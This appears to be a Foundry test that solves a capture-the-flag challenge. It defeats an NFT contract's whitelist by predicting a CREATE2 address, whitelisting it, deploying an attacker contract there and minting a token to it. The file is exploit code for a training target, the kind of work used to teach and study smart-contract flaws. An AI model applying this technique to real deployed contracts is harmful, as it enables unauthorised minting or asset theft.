pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/utils/Address.sol";
import "../src/Whitelist/challenge.sol";


contract MevSecNFTTest is Test {
    MevSecNFT public nft;
    using Address for address;

    address public attacker = address(0x999999999999999999999999999);

    function setUp() public {
        nft = new MevSecNFT();

    }    

    function testMevSecNFT() public {

        vm.startPrank(attacker,attacker);
        AttackerFactory at = new AttackerFactory();
        uint256 _salt = 123;
        address contractAddress = at.getAddress(_salt);
        nft.addToWhitelist(contractAddress);
        address deployedAddress = at.clone(_salt);
        assert(deployedAddress == contractAddress);
        nft.mint(contractAddress);
        vm.stopPrank();
        // ...
        assert(contractAddress == nft.ownerOf(1337));
    }
}

contract AttackerFactory {
    function clone(uint256 _salt) public payable returns (address) {
        address predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            _salt,
            keccak256(abi.encodePacked(
                type(Attacker).creationCode
            ))
        )))));

        Attacker a = new Attacker{salt: bytes32(_salt)}();
        require(address(a) == predictedAddress);  
        return predictedAddress;      
    }

    function getAddress(uint256 salt)
        public
        view
        returns (address)
    {
        address predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            keccak256(abi.encodePacked(
                type(Attacker).creationCode
            ))
        )))));
        return predictedAddress;
    }    
}
contract Attacker {

    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns(bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}